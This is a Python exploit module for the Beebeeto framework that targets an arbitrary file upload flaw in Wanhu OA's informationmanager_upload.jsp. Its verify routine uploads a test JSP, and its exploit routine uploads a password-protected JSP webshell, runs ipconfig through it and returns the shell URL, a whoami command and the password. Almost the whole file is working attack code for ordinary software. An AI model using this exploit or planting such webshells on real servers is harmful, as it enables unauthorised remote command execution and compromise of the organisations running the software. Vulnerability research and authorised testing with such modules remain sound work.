#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame

from utils.payload.webshell import JspShell
from utils.payload.webshell import JspVerify


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0216',
            'name': '万户OA \defaultroot\information_manager\informationmanager_upload.jsp 任意文件上传漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-12-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '万户OA',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['万户OA任意文件上传漏洞', 'File Upload', 'jsp'],
            'desc': '''
                    上传的地方基本都是调用smartUpload的javabean:

                    <%@ page language="java" import="com.jspsmart.upload.*"%>
                    <jsp:useBean id="myUpload" scope="page" class="com.jspsmart.upload.SmartUpload" />
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-067391',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        vul_path = '%s/defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null'
        verify_url = vul_path % args['options']['target']
        jsp = JspVerify()
        file_v_jsp = jsp.get_content()
        files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}
        # Print verbose
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Content: ' + file_v_jsp
        # Upload&Check
        response = requests.post(verify_url, files=files)
        reg = re.findall(r'opener.document.all.null.value = "(\d{25}).jsp"',response.content)
        success_url = '%s/defaultroot/upload/information/%s.jsp' % (args['options']['target'], reg[0])
        response = requests.get(success_url)
        content = response.content
        if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['upload_url'] = success_url
        return args


    @classmethod
    def exploit(cls, args):
        vul_path = '%s/defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null'
        verify_url = vul_path % args['options']['target']
        jsp = JspShell(pwd='foundu')
        file_v_jsp = jsp.get_content()
        files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}
        # Print verbose
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Content: ' + file_v_jsp
        # Upload&Check
        response = requests.post(verify_url, files=files)
        reg = re.findall(r'opener.document.all.null.value = "(\d{25}).jsp"',response.content)
        success_url = '%s/defaultroot/upload/information/%s.jsp?foundu=ipconfig' % (args['options']['target'], reg[0])
        response = requests.get(success_url)
        content = response.content
        if 'Windows IP Configuration' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['webshell'] = success_url + '?foundu=whoami'
            args['poc_ret']['password'] = 'foundu'
        return args

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())